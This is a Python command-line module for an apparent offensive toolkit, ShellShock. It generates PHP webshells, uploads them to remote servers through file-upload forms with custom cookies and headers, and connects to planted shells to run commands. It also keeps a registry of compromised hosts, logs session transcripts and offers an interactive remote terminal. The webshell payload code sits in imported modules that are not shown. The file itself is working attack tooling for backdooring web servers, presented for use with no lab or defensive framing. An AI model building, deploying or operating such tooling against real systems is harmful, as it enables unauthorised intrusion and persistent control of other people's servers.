"""ShellShock CLI: `shellsuite shock <action>`."""

from __future__ import annotations

import argparse
import json
import sys
from pathlib import Path

from shellsuite import config
from shellsuite.protocol import contract
from shellshock.creator import generator
from shellshock.creator.spec import WebShellSpec

#For some reason this won't work with just "creator", it has to be ".creator".
from .creator import drivers
from . import uploader
from .manager import client, registry, sessions, terminal

# The word the user types after `shellsuite` (the package is still `shellshock`).
COMMAND = "shock"


def _cmd_create(args: argparse.Namespace) -> int:
    spec = WebShellSpec(
        vector=args.vector,
        mode=args.mode,
        name=args.name,
        secret=args.secret,
        driver=args.driver,
    )
    try:
        dest = generator.write(spec, Path(args.out) if args.out else None)
    except ValueError as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 2
    print(dest)
    return 0


def _resolve_file(value: str) -> Path:
    """Resolve a webshell: absolute paths as-is, names under the shells dir."""
    path = Path(value)
    if not path.is_absolute():
        path = config.shells_dir() / path
    if not path.is_file():
        raise ValueError(f"webshell not found: {path}")
    return path


def _parse_form(values: list[str]) -> dict[str, str]:
    result: dict[str, str] = {}
    for item in values:
        key, sep, value = item.partition("=")
        if not sep or not key:
            raise ValueError(f"invalid --form value: {item!r} (expected key=value)")
        result[key] = value
    return result


def _parse_headers(values: list[str]) -> dict[str, str]:
    result: dict[str, str] = {}
    for item in values:
        name, sep, value = item.partition(":")
        if not sep or not name.strip():
            raise ValueError(f"invalid --header value: {item!r} (expected 'Name: value')")
        result[name.strip()] = value.strip()
    return result


def _cmd_upload(args: argparse.Namespace) -> int:
    try:
        path = _resolve_file(args.file)
        form = _parse_form(args.form)
        headers = _parse_headers(args.header)
        result = uploader.upload(
            path,
            args.url,
            field=args.field,
            filename=args.filename,
            cookie=args.cookie,
            headers=headers,
            form=form,
            timeout=args.timeout,
        )
    except (ValueError, OSError) as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 2

    if result.success:
        print(f"Upload succeeded (HTTP {result.status}): {result.final_url}")
        return 0

    detail = (
        f"HTTP {result.status}"
        if result.status is not None
        else (result.error or "no response")
    )
    print(f"Upload failed ({detail}): {result.final_url or args.url}", file=sys.stderr)
    return 1


def _cmd_manage_connect(args: argparse.Namespace) -> int:
    shell = client.WebShell(
        url=args.url,
        vector=args.vector,
        mode=args.mode,
        secret=args.secret,
        name=args.name,
    )
    try:
        result = client.connect(shell, command=args.command, timeout=args.timeout)
    except ValueError as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 2

    if not result.success:
        print(f"connect failed: {result.error}", file=sys.stderr)
        return 1

    try:
        store = registry.Registry()
        store.load()
        store.upsert(
            url=shell.url,
            vector=shell.vector,
            mode=shell.mode,
            has_secret=shell.mode in ("auth", "encrypted"),
            name=args.name,
        )
        store.save()
    except (registry.RegistryError, OSError) as exc:
        print(f"warning: could not register shell: {exc}", file=sys.stderr)

    sys.stdout.write(f"connect successful: {result.output}")
    if not result.output.endswith("\n"):
        sys.stdout.write("\n")
    return 0


def _format_shell_block(record: registry.ShellRecord) -> str:
    title = record.name or record.url
    return (
        f"== {title} ==\n"
        f"id:         {record.id}\n"
        f"url:        {record.url}\n"
        f"vector:     {record.vector}\n"
        f"mode:       {record.mode}\n"
        f"has_secret: {'yes' if record.has_secret else 'no'}\n"
        f"created:    {record.created_at}\n"
        f"last_used:  {record.last_used}"
    )


def _format_session_block(summary: sessions.SessionSummary) -> str:
    duration = f"{summary.duration}s" if summary.duration is not None else "-"
    return (
        f"== {summary.shell} - {summary.started_at} ==\n"
        f"session:   {summary.id}\n"
        f"shell_id:  {summary.shell_id}\n"
        f"url:       {summary.url}\n"
        f"vector:    {summary.vector}\n"
        f"mode:      {summary.mode}\n"
        f"status:    {summary.status}\n"
        f"started:   {summary.started_at}\n"
        f"ended:     {summary.ended_at or '-'}\n"
        f"duration:  {duration}\n"
        f"commands:  {summary.commands}"
    )


def _cmd_manage_list_shells(args: argparse.Namespace) -> int:
    try:
        store = registry.Registry()
        store.load()
    except registry.RegistryError as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 1

    if args.asc:
        descending = False
    elif args.desc:
        descending = True
    else:
        descending = args.order in registry.DATE_FIELDS

    try:
        records = store.query(
            order=args.order, descending=descending, filters=tuple(args.filter)
        )
    except registry.RegistryError as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 2

    if args.json:
        payload = {
            "version": registry.REGISTRY_VERSION,
            "shells": [record.to_dict() for record in records],
        }
        print(json.dumps(payload, indent=2))
        return 0

    if not records:
        print("no shells registered")
        return 0

    print("\n\n".join(_format_shell_block(record) for record in records))
    return 0


def _cmd_manage_list_sessions(args: argparse.Namespace) -> int:
    if args.asc:
        descending = False
    elif args.desc:
        descending = True
    else:
        descending = args.order in sessions.SESSION_DATE_FIELDS

    try:
        sessions.check_query(args.order, tuple(args.filter))
    except sessions.SessionError as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 2

    try:
        summaries = sessions.list_sessions(
            shell_id=args.id,
            order=args.order,
            descending=descending,
            filters_expr=tuple(args.filter),
        )
    except sessions.SessionError as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 1

    if args.json:
        payload = {
            "version": sessions.SESSION_VERSION,
            "sessions": [summary.to_dict() for summary in summaries],
        }
        print(json.dumps(payload, indent=2))
        return 0

    if not summaries:
        print("no sessions recorded")
        return 0

    print("\n\n".join(_format_session_block(summary) for summary in summaries))
    return 0


def _cmd_manage_show_shell(args: argparse.Namespace) -> int:
    try:
        store = registry.Registry()
        store.load()
    except registry.RegistryError as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 1

    record = store.get(args.id)
    if record is None:
        print(f"error: no shell with id {args.id!r}", file=sys.stderr)
        return 1

    if args.json:
        payload = {"version": registry.REGISTRY_VERSION, "shell": record.to_dict()}
        print(json.dumps(payload, indent=2))
    else:
        print(_format_shell_block(record))
    return 0


def _cmd_manage_show_session(args: argparse.Namespace) -> int:
    try:
        data = sessions.show_session(args.id)
    except sessions.SessionError as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 1

    summary = data["summary"]
    if args.json:
        payload = {
            "version": sessions.SESSION_VERSION,
            "session": summary.to_dict(),
            "events": data["events"],
        }
        print(json.dumps(payload, indent=2))
        return 0

    print(_format_session_block(summary))
    for event in data["events"]:
        if event.get("type") == "truncated":
            print("\n[transcript truncated]")
            continue
        print(f"\n$ {event.get('command')}")
        if event.get("success"):
            output = event.get("output") or ""
            sys.stdout.write(output)
            if output and not output.endswith("\n"):
                sys.stdout.write("\n")
        else:
            print(f"error: {event.get('error')}")
    return 0


def _cmd_manage_edit_shell(args: argparse.Namespace) -> int:
    changes: dict[str, str | None] = {}
    if args.clear_name:
        changes["name"] = None
    elif args.name is not None:
        changes["name"] = args.name if args.name != "" else None
    if not changes:
        print("error: nothing to edit (use --name or --clear-name)", file=sys.stderr)
        return 2

    try:
        store = registry.Registry()
        store.load()
        record = store.update(args.id, changes)
        store.save()
    except registry.RegistryError as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 1

    print(f"updated {record.id}: name = {record.name!r}")
    return 0


def _cmd_manage_delete_shell(args: argparse.Namespace) -> int:
    try:
        store = registry.Registry()
        store.load()
        record = store.delete(args.id)
        store.save()
    except registry.RegistryError as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 1

    print(f"deleted {record.name or record.url} ({record.id})")
    return 0


def _cmd_manage_delete_session(args: argparse.Namespace) -> int:
    try:
        summary = sessions.delete_session(args.id)
    except sessions.SessionError as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 1

    print(f"deleted session {summary.id} ({summary.shell})")
    return 0


def _cmd_manage_terminal(args: argparse.Namespace) -> int:
    try:
        store = registry.Registry()
        store.load()
    except registry.RegistryError as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 1

    record = store.get(args.id)
    if record is None:
        print(f"error: no shell with id {args.id!r}", file=sys.stderr)
        return 1

    if record.has_secret and not args.secret:
        print("error: this shell requires --secret", file=sys.stderr)
        return 2

    try:
        store.touch(record.id)
        store.save()
    except (registry.RegistryError, OSError) as exc:
        print(f"warning: could not update last_used: {exc}", file=sys.stderr)

    try:
        recorder = sessions.SessionRecorder.start(record)
    except sessions.SessionError as exc:
        recorder = None
        print(f"warning: session will not be logged: {exc}", file=sys.stderr)

    shell = client.WebShell(
        url=record.url,
        vector=record.vector,
        mode=record.mode,
        secret=args.secret if record.has_secret else None,
        name=record.name or record.url,
    )

    if args.json:
        def read_line(_prompt: str) -> str | None:
            line = sys.stdin.readline()
            return None if line == "" else line

        sys.stdout.write(
            json.dumps(
                {
                    "event": "session",
                    "id": recorder.id if recorder is not None else None,
                    "shell_id": record.id,
                    "shell": record.name or record.url,
                }
            )
            + "\n"
        )
    else:
        def read_line(prompt: str) -> str | None:
            try:
                return input(prompt)
            except EOFError:
                return None

    status = sessions.STATUS_COMPLETED
    try:
        rc = terminal.interact(
            shell,
            read_line=read_line,
            write=sys.stdout.write,
            write_err=sys.stderr.write,
            timeout=args.timeout,
            json_mode=args.json,
            on_event=recorder.record if recorder is not None else None,
        )
    except KeyboardInterrupt:
        sys.stdout.write("\n")
        rc = 130
        status = sessions.STATUS_INTERRUPTED
    except Exception:
        status = sessions.STATUS_ERROR
        raise
    else:
        status = {
            0: sessions.STATUS_COMPLETED,
            1: sessions.STATUS_ERROR,
            130: sessions.STATUS_INTERRUPTED,
        }.get(rc, sessions.STATUS_COMPLETED)
    finally:
        if recorder is not None:
            recorder.finish(status)

    return rc


def register_parser(subparsers: argparse._SubParsersAction) -> None:
    parser = subparsers.add_parser(COMMAND, help="webshell creation and management")
    actions = parser.add_subparsers(dest="action", metavar="<action>")

    create = actions.add_parser("create", help="generate a webshell")
    create.add_argument("--vector", choices = contract.VECTORS, required=True)
    create.add_argument("--mode", choices = contract.MODES, required=True)
    create.add_argument("--name", default = "shell")
    create.add_argument("--out", default = None, help = "output path")
    create.add_argument("--secret", default = None, help = "password (required for auth/encrypted)")
    create.add_argument(
        "--driver",
        choices=list(drivers.DRIVERS),
        default=None,
        help=f"PHP execution function (default: {drivers.DEFAULT_DRIVER})",
    )
    create.set_defaults(handler=_cmd_create)

    upload = actions.add_parser("upload", help="upload a webshell to a remote endpoint")
    upload.add_argument(
        "--file", required=True, help="webshell path (names resolve under the shells dir)"
    )
    upload.add_argument("--url", required=True, help="upload endpoint URL")
    upload.add_argument(
        "--field", default="uploaded", help="multipart file field name (default: uploaded)"
    )
    upload.add_argument(
        "--filename", default=None, help="uploaded filename (default: local basename)"
    )
    upload.add_argument("--cookie", default=None, help="Cookie header value")
    upload.add_argument(
        "--header", action="append", default=[], help="extra header 'Name: value' (repeatable)"
    )
    upload.add_argument(
        "--form", action="append", default=[], help="extra form field key=value (repeatable)"
    )
    upload.add_argument(
        "--timeout", type=float, default=15.0, help="request timeout in seconds"
    )
    upload.set_defaults(handler=_cmd_upload)

    manage = actions.add_parser("manage", help="connect to and manage webshells")
    manage_actions = manage.add_subparsers(dest="manage_action", metavar="<action>")

    connect = manage_actions.add_parser("connect", help="connect to a deployed webshell")
    connect.add_argument("--url", required=True, help="webshell URL")
    connect.add_argument("--vector", choices=contract.VECTORS, required=True)
    connect.add_argument("--mode", choices=contract.MODES, required=True)
    connect.add_argument("--secret", default=None, help="password (required for auth/encrypted)")
    connect.add_argument("--name", default=None, help="name to register the shell under")
    connect.add_argument("--command", default="id", help="command to run (default: id)")
    connect.add_argument(
        "--timeout", type=float, default=15.0, help="request timeout in seconds"
    )
    connect.set_defaults(handler=_cmd_manage_connect)

    list_cmd = manage_actions.add_parser("list", help="list shells or sessions")
    list_actions = list_cmd.add_subparsers(dest="list_kind", metavar="<kind>")

    shells_cmd = list_actions.add_parser("shells", help="list known webshells")
    shells_cmd.add_argument(
        "--order",
        choices=registry.ORDER_FIELDS,
        default="last_used",
        help="sort field (default: last_used)",
    )
    shells_direction = shells_cmd.add_mutually_exclusive_group()
    shells_direction.add_argument("--asc", action="store_true", help="ascending order")
    shells_direction.add_argument("--desc", action="store_true", help="descending order")
    shells_cmd.add_argument(
        "--filter",
        action="append",
        default=[],
        help="filter 'attr op value' (repeatable, ANDed)",
    )
    shells_cmd.add_argument("--json", action="store_true", help="machine-readable JSON")
    shells_cmd.set_defaults(handler=_cmd_manage_list_shells)

    sessions_cmd = list_actions.add_parser("sessions", help="list recorded sessions")
    sessions_cmd.add_argument(
        "--id", default=None, help="only sessions of this shell id"
    )
    sessions_cmd.add_argument(
        "--order",
        choices=sessions.SESSION_FIELDS,
        default="started_at",
        help="sort field (default: started_at)",
    )
    sessions_direction = sessions_cmd.add_mutually_exclusive_group()
    sessions_direction.add_argument("--asc", action="store_true", help="ascending order")
    sessions_direction.add_argument("--desc", action="store_true", help="descending order")
    sessions_cmd.add_argument(
        "--filter",
        action="append",
        default=[],
        help="filter 'attr op value' (repeatable, ANDed)",
    )
    sessions_cmd.add_argument("--json", action="store_true", help="machine-readable JSON")
    sessions_cmd.set_defaults(handler=_cmd_manage_list_sessions)

    show_cmd = manage_actions.add_parser("show", help="show one shell or session")
    show_actions = show_cmd.add_subparsers(dest="show_kind", metavar="<kind>")

    show_shell = show_actions.add_parser("shell", help="show one webshell")
    show_shell.add_argument("--id", required=True, help="shell id")
    show_shell.add_argument("--json", action="store_true", help="machine-readable JSON")
    show_shell.set_defaults(handler=_cmd_manage_show_shell)

    show_session = show_actions.add_parser("session", help="show one session transcript")
    show_session.add_argument("--id", required=True, help="session id")
    show_session.add_argument("--json", action="store_true", help="machine-readable JSON")
    show_session.set_defaults(handler=_cmd_manage_show_session)

    edit_cmd = manage_actions.add_parser("edit", help="edit a known webshell")
    edit_actions = edit_cmd.add_subparsers(dest="edit_kind", metavar="<kind>")

    edit_shell = edit_actions.add_parser("shell", help="edit a webshell")
    edit_shell.add_argument("id", help="shell id (see 'manage list shells')")
    edit_name = edit_shell.add_mutually_exclusive_group()
    edit_name.add_argument(
        "--name",
        default=None,
        help="new name (an empty string clears it in shells that pass empty args)",
    )
    edit_name.add_argument(
        "--clear-name",
        action="store_true",
        help="remove the name (title falls back to the URL)",
    )
    edit_shell.set_defaults(handler=_cmd_manage_edit_shell)

    delete_cmd = manage_actions.add_parser("delete", help="delete a shell or session")
    delete_actions = delete_cmd.add_subparsers(dest="delete_kind", metavar="<kind>")

    delete_shell = delete_actions.add_parser("shell", help="delete a webshell")
    delete_shell.add_argument("id", help="shell id (see 'manage list shells')")
    delete_shell.set_defaults(handler=_cmd_manage_delete_shell)

    delete_session = delete_actions.add_parser("session", help="delete a session")
    delete_session.add_argument("--id", required=True, help="session id")
    delete_session.set_defaults(handler=_cmd_manage_delete_session)

    terminal_cmd = manage_actions.add_parser(
        "terminal", help="interactive terminal for a known webshell"
    )
    terminal_cmd.add_argument("id", help="shell id (see 'manage list shells')")
    terminal_cmd.add_argument(
        "--secret",
        default=None,
        help="password (required for shells that use auth/encryption)",
    )
    terminal_cmd.add_argument(
        "--timeout", type=float, default=15.0, help="per-command timeout in seconds"
    )
    terminal_cmd.add_argument(
        "--json", action="store_true", help="line-delimited JSON output (for the GUI)"
    )
    terminal_cmd.set_defaults(handler=_cmd_manage_terminal)
